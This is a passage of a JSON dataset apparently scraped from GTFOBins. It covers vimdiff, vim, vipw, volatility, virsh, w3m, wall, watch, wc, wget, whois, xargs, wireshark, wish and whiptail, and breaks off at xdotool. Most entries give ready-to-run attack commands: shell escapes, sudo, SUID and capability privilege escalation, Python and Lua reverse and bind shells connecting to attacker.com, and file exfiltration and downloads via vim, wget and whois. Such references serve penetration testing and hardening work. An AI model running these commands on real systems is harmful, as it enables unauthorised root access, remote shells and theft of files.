                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "vimdiff -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo vimdiff -c ':!/bin/sh'"
                    },
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo vimdiff -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that vimdiff is compiled with Lua support.",
                        "code": "sudo vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "cp $(which vimdiff) .\nsudo setcap cap_setuid+ep vimdiff\n\n./vimdiff -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that vimdiff is compiled with Lua support.",
                        "code": "sudo install -m =xs $(which vimdiff) .\n\n./vimdiff -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "vim",
        "url": "https://gtfobins.github.io/gtfobins/vim/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "vim -c ':!/bin/sh'"
                    },
                    {
                        "description": "",
                        "code": "vim --cmd ':set shell=/bin/sh|:shell'"
                    },
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that vim is compiled with Lua support.",
                        "code": "vim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Reverse shell",
                "description": "It can send back a reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3. Run socat file:`tty`,raw,echo=0 tcp-listen:12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':py import vim,sys,socket,os,pty;s=socket.socket()\ns.connect((os.getenv(\"RHOST\"),int(os.getenv(\"RPORT\"))))\n[os.dup2(s.fileno(),fd) for fd in (0,1,2)]\npty.spawn(\"/bin/sh\")\nvim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell. This requires that vim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nvim -c ':lua local s=require(\"socket\"); local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  while true do\n    local r,x=t:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));t:send(b);\n  end;\n  f:close();t:close();'"
                    }
                ]
            },
            {
                "function": "Non-interactive bind shell",
                "description": "It can bind a non-interactive shell to a local port to allow remote network access.",
                "examples": [
                    {
                        "description": "Run nc target.com 12345 on the attacker box to connect to the shell. This requires that vim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  while true do\n    local r,x=c:receive();local f=assert(io.popen(r,\"r\"));\n    local b=assert(f:read(\"*a\"));c:send(b);\n  end;c:close();f:close();'"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3. Send local file via “d” parameter of a HTTP POST request. Run an HTTP service on the attacker box to collect the file.",
                        "code": "export URL=http://attacker.com/\nexport LFILE=file_to_send\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r, urllib.parse as u\nelse: import urllib as u, urllib2 as r\nr.urlopen(e[\"URL\"], bytes(u.urlencode({\"d\":open(e[\"LFILE\"]).read()}).encode()))\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3. Serve files in the local folder running an HTTP server.",
                        "code": "export LPORT=8888\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import http.server as s, socketserver as ss\nelse: import SimpleHTTPServer as s, SocketServer as ss\nss.TCPServer((\"\", int(e[\"LPORT\"])), s.SimpleHTTPRequestHandler).serve_forever()\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Send a local file via TCP. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. This requires that vim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\nexport LFILE=file_to_send\nvim -c ':lua local f=io.open(os.getenv(\"LFILE\"), 'rb')\n  local d=f:read(\"*a\")\n  io.close(f);\n  local s=require(\"socket\");\n  local t=assert(s.tcp());\n  t:connect(os.getenv(\"RHOST\"),os.getenv(\"RPORT\"));\n  t:send(d);\n  t:close();'"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3. Fetch a remote file via HTTP GET request.",
                        "code": "export URL=http://attacker.com/file_to_get\nexport LFILE=file_to_save\nvim -c ':py import vim,sys; from os import environ as e\nif sys.version_info.major == 3: import urllib.request as r\nelse: import urllib as r\nr.urlretrieve(e[\"URL\"], e[\"LFILE\"])\nvim.command(\":q!\")'"
                    },
                    {
                        "description": "Fetch a remote file via TCP. Run nc target.com 12345 < \"file_to_send\" on the attacker box to send the file. This requires that vim is compiled with Lua support and that lua-socket is installed.",
                        "code": "export LPORT=12345\nexport LFILE=file_to_save\nvim -c ':lua local k=require(\"socket\");\n  local s=assert(k.bind(\"*\",os.getenv(\"LPORT\")));\n  local c=s:accept();\n  local d,x=c:receive(\"*a\");\n  c:close();\n  local f=io.open(os.getenv(\"LFILE\"), \"wb\");\n  f:write(d);\n  io.close(f);'"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vim file_to_write\niDATA\n^[\nw"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "vim file_to_read"
                    }
                ]
            },
            {
                "function": "Library load",
                "description": "It loads shared libraries that may be used to run code in the binary execution context.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "vim -c ':py import vim; from ctypes import cdll; cdll.LoadLibrary(\"lib.so\"); vim.command(\":q!\")'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo install -m =xs $(which vim) .\n\n./vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-pc\", \"reset; exec sh -p\")'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo vim -c ':!/bin/sh'"
                    },
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "sudo vim -c ':py import os; os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    },
                    {
                        "description": "This requires that vim is compiled with Lua support.",
                        "code": "sudo vim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Capabilities",
                "description": "If the binary has the Linux CAP_SETUID capability set or it is executed by another binary with the capability set, it can be used as a backdoor to maintain privileged access by manipulating its own process UID.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Python support. Prepend :py3 for Python 3.",
                        "code": "cp $(which vim) .\nsudo setcap cap_setuid+ep vim\n\n./vim -c ':py import os; os.setuid(0); os.execl(\"/bin/sh\", \"sh\", \"-c\", \"reset; exec sh\")'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This requires that vim is compiled with Lua support.",
                        "code": "sudo install -m =xs $(which vim) .\n\n./vim -c ':lua os.execute(\"reset; exec sh\")'"
                    }
                ]
            }
        ]
    },
    {
        "name": "vipw",
        "url": "https://gtfobins.github.io/gtfobins/vipw/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "This command allows to edit some designated files (/etc/passwd, /etc/group, /etc/shadow and /etc/gshadow) safely by spawning the default editor (falling back to vim, other functions may apply). Despite requiring superuser privileges to run, the editor is executed as the unprivileged user when run as SUID or with sudo."
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which vipw) .\n\n./vipw"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo vipw"
                    }
                ]
            }
        ]
    },
    {
        "name": "volatility",
        "url": "https://gtfobins.github.io/gtfobins/volatility/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "This command requires some valid coredump file which, if not available, can be uploaded to the target. The volshell command spawns a python shell, other functions may apply."
                    }
                ]
            },
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "volatility -f file.dump volshell\n__import__('os').system('/bin/sh')"
                    }
                ]
            }
        ]
    },
    {
        "name": "virsh",
        "url": "https://gtfobins.github.io/gtfobins/virsh/",
        "functions": [
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This requires the user to be in the libvirt group to perform privileged file write. If the target directory doesn’t exist, pool-create-as must be run with the --build option. The destination file ownership and permissions can be set in the XML.",
                        "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_write\n\necho 'data' > data_to_write\n\nTF=$(mktemp)\ncat > $TF <<EOF\n<volume type='file'>\n  <name>y</name>\n  <key>$LFILE_DIR/$LFILE_NAME</key>\n  <source>\n  </source>\n  <capacity unit='bytes'>5</capacity>\n  <allocation unit='bytes'>4096</allocation>\n  <physical unit='bytes'>5</physical>\n  <target>\n    <path>$LFILE_DIR/$LFILE_NAME</path>\n    <format type='raw'/>\n    <permissions>\n      <mode>0600</mode>\n      <owner>0</owner>\n      <group>0</group>\n    </permissions>\n  </target>\n</volume>\nEOF\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-create --pool x --file $TF\nvirsh -c qemu:///system vol-upload --pool x $LFILE_DIR/$LFILE_NAME data_to_write\nvirsh -c qemu:///system pool-destroy x"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This requires the user to be in the libvirt group to perform privileged file read.",
                        "code": "LFILE_DIR=/root\nLFILE_NAME=file_to_read\n\nSPATH=file_to_save\n\nvirsh -c qemu:///system pool-create-as x dir --target $LFILE_DIR\nvirsh -c qemu:///system vol-download --pool x $LFILE_NAME $SPATH\nvirsh -c qemu:///system pool-destroy x"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "SCRIPT=script_to_run\nTF=$(mktemp)\ncat > $TF << EOF\n<domain type='kvm'>\n  <name>x</name>\n  <os>\n    <type arch='x86_64'>hvm</type>\n  </os>\n  <memory unit='KiB'>1</memory>\n  <devices>\n    <interface type='ethernet'>\n      <script path='$SCRIPT'/>\n    </interface>\n  </devices>\n</domain>\nEOF\nsudo virsh -c qemu:///system create $TF\nvirsh -c qemu:///system destroy x"
                    }
                ]
            }
        ]
    },
    {
        "name": "w3m",
        "url": "https://gtfobins.github.io/gtfobins/w3m/",
        "functions": [
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nw3m \"$LFILE\" -dump"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which w3m) .\n\nLFILE=file_to_read\n./w3m \"$LFILE\" -dump"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo w3m \"$LFILE\" -dump"
                    }
                ]
            }
        ]
    },
    {
        "name": "wall",
        "url": "https://gtfobins.github.io/gtfobins/wall/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "The textual file is dumped on the current TTY (neither to stdout nor to stderr)."
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo wall --nobanner \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "watch",
        "url": "https://gtfobins.github.io/gtfobins/watch/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "This keeps the SUID privileges only if the -x option is present.",
                        "code": "sudo install -m =xs $(which watch) .\n\n./watch -x sh -p -c 'reset; exec sh -p 1>&0 2>&0'"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo watch -x sh -c 'reset; exec sh 1>&0 2>&0'"
                    }
                ]
            },
            {
                "function": "Limited SUID",
                "description": "If the binary has the SUID bit set, it may be abused to access the file system, escalate or maintain access with elevated privileges working as a SUID backdoor. If it is used to run commands (e.g., via system()-like invocations) it only works on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which watch) .\n\n./watch 'reset; exec sh 1>&0 2>&0'"
                    }
                ]
            }
        ]
    },
    {
        "name": "wc",
        "url": "https://gtfobins.github.io/gtfobins/wc/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "The file content is parsed as a sequence of \\x00 separated paths. On error the file content appears in a message, so this may not be suitable to read binary files."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nwc --files0-from \"$LFILE\""
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which wc) .\n\nLFILE=file_to_read\n./wc --files0-from \"$LFILE\""
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo wc --files0-from \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "wget",
        "url": "https://gtfobins.github.io/gtfobins/wget/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nwget --use-askpass=$TF 0"
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send local file with an HTTP POST request. Run an HTTP service on the attacker box to collect the file. Note that the file will be sent as-is, instruct the service to not URL-decode the body. Use --post-data to send hard-coded data.",
                        "code": "URL=http://attacker.com/\nLFILE=file_to_send\nwget --post-file=$LFILE $URL"
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch a remote file via HTTP GET request.",
                        "code": "URL=http://attacker.com/file_to_get\nLFILE=file_to_save\nwget $URL -O $LFILE"
                    }
                ]
            },
            {
                "function": "File write",
                "description": "It writes data to files, it may be used to do privileged writes or write files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The data to be written is treated as a list of URLs, one per line, which are actually fetched by wget. The data is written, somewhat modified, as error messages, thus this is not suitable to write arbitrary binary data.",
                        "code": "LFILE=file_to_write\nTF=$(mktemp)\necho DATA > $TF\nwget -i $TF -o $LFILE"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "The file to be read is treated as a list of URLs, one per line, which are actually fetched by wget. The content appears, somewhat modified, as error messages, thus this is not suitable to read arbitrary binary data.",
                        "code": "LFILE=file_to_read\nwget -i $LFILE"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which wget) .\n\nTF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh -p\\n/bin/sh -p 1>&0' >$TF\n./wget --use-askpass=$TF 0"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "TF=$(mktemp)\nchmod +x $TF\necho -e '#!/bin/sh\\n/bin/sh 1>&0' >$TF\nsudo wget --use-askpass=$TF 0"
                    }
                ]
            }
        ]
    },
    {
        "name": "whois",
        "url": "https://gtfobins.github.io/gtfobins/whois/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "description": "whois hangs waiting for the remote peer to close the socket."
                    }
                ]
            },
            {
                "function": "File upload",
                "description": "It can exfiltrate files on the network.",
                "examples": [
                    {
                        "description": "Send a text file to a TCP port. Run nc -l -p 12345 > \"file_to_save\" on the attacker box to collect the file. The file has a trailing $'\\x0d\\x0a' and its length is limited by the maximum size of arguments.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`cat $LFILE`\""
                    },
                    {
                        "description": "Send a binary file to a TCP port. Run nc -l -p 12345 | tr -d $'\\x0d' | base64 -d > \"file_to_save\" on the attacker box to collect the file. The file length is limited by the maximum size of arguments.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_send\nwhois -h $RHOST -p $RPORT \"`base64 $LFILE`\""
                    }
                ]
            },
            {
                "function": "File download",
                "description": "It can download remote files.",
                "examples": [
                    {
                        "description": "Fetch remote text file from a remote TCP port. Run nc -l -p 12345 < \"file_to_send\" on the attacker box to send the file. The file has instances of $'\\x0d' stripped.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT > \"$LFILE\""
                    },
                    {
                        "description": "Fetch remote binary file from a remote TCP port. Run base64 \"file_to_send\" | nc -l -p 12345 on the attacker box to send the file.",
                        "code": "RHOST=attacker.com\nRPORT=12345\nLFILE=file_to_save\nwhois -h $RHOST -p $RPORT | base64 -d > \"$LFILE\""
                    }
                ]
            }
        ]
    },
    {
        "name": "xargs",
        "url": "https://gtfobins.github.io/gtfobins/xargs/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "xargs -a /dev/null sh"
                    },
                    {
                        "description": "",
                        "code": "echo x | xargs -Iy sh -c 'exec sh 0<&1'"
                    },
                    {
                        "description": "Read interactively from stdin.",
                        "code": "xargs -Ix sh -c 'exec sh 0<&1'\nx^D^D"
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "This works as long as the file does not contain the NUL character, also a trailing $'\\n' is added. The actual /bin/echo command is executed. GNU version only.",
                        "code": "LFILE=file_to_read\nxargs -a \"$LFILE\" -0"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "sudo install -m =xs $(which xargs) .\n\n./xargs -a /dev/null sh -p"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "GNU version only.",
                        "code": "sudo xargs -a /dev/null sh"
                    }
                ]
            }
        ]
    },
    {
        "name": "wireshark",
        "url": "https://gtfobins.github.io/gtfobins/wireshark/",
        "functions": [
            {
                "function": "Command",
                "description": "It can be used to break out from restricted environments by running non-interactive system commands.",
                "examples": [
                    {
                        "description": "This requires GUI interaction. Start Wireshark, then from the main menu, select “Tools” -> “Lua” -> “Evaluate”. A window opens that allows to execute lua code.",
                        "code": "wireshark"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "This technique can be used to write arbitrary files, i.e., the dump of one UDP packet.\n\nAfter starting Wireshark, and waiting for the capture to begin, deliver the UDP packet, e.g., with nc (see below). The capture then stops and the packet dump can be saved:\n\n\t1. select the only received packet;\n\t2. right-click on “Data” from the “Packet Details” pane, and select “Export Packet Bytes…”;\n\t3. choose where to save the packet dump.",
                        "code": "PORT=4444\nsudo wireshark -c 1 -i lo -k -f \"udp port $PORT\" &\necho 'DATA' | nc -u 127.127.127.127 \"$PORT\""
                    }
                ]
            }
        ]
    },
    {
        "name": "wish",
        "url": "https://gtfobins.github.io/gtfobins/wish/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
                        "description": "",
                        "code": "wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"
                    }
                ]
            },
            {
                "function": "Non-interactive reverse shell",
                "description": "It can send back a non-interactive reverse shell to a listening attacker to open a remote network access.",
                "examples": [
                    {
                        "description": "Run nc -l -p 12345 on the attacker box to receive the shell.",
                        "code": "export RHOST=attacker.com\nexport RPORT=12345\necho 'set s [socket $::env(RHOST) $::env(RPORT)];while 1 { puts -nonewline $s \"> \";flush $s;gets $s c;set e \"exec $c\";if {![catch {set r [eval $e]} err]} { puts $s $r }; flush $s; }; close $s;' | wish"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo wish\nexec /bin/sh <@stdin >@stdout 2>@stderr"
                    }
                ]
            }
        ]
    },
    {
        "name": "whiptail",
        "url": "https://gtfobins.github.io/gtfobins/whiptail/",
        "functions": [
            {
                "function": "info",
                "description": "",
                "examples": [
                    {
                        "sub_description": "The file is shown in an interactive TUI dialog made for displaying text, arrows can be used to scroll long content."
                    }
                ]
            },
            {
                "function": "File read",
                "description": "It reads data from files, it may be used to do privileged reads or disclose files outside a restricted file system.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nwhiptail --textbox --scrolltext \"$LFILE\" 0 0"
                    }
                ]
            },
            {
                "function": "SUID",
                "description": "If the binary has the SUID bit set, it does not drop the elevated privileges and may be abused to access the file system, escalate or maintain privileged access as a SUID backdoor. If it is used to run sh -p, omit the -p argument on systems like Debian (<= Stretch) that allow the default sh shell to run with SUID privileges.\n\nThis example creates a local SUID copy of the binary and runs it to maintain elevated privileges. To interact with an existing SUID binary skip the first command and run the program using its original path.",
                "examples": [
                    {
                        "description": "",
                        "code": "sudo install -m =xs $(which whiptail) .\n\nLFILE=file_to_read\n./whiptail --textbox --scrolltext \"$LFILE\" 0 0"
                    }
                ]
            },
            {
                "function": "Sudo",
                "description": "If the binary is allowed to run as superuser by sudo, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.",
                "examples": [
                    {
                        "description": "",
                        "code": "LFILE=file_to_read\nsudo whiptail --textbox --scrolltext \"$LFILE\" 0 0"
                    }
                ]
            }
        ]
    },
    {
        "name": "xdotool",
        "url": "https://gtfobins.github.io/gtfobins/xdotool/",
        "functions": [
            {
                "function": "Shell",
                "description": "It can be used to break out from restricted environments by spawning an interactive system shell.",
                "examples": [
                    {
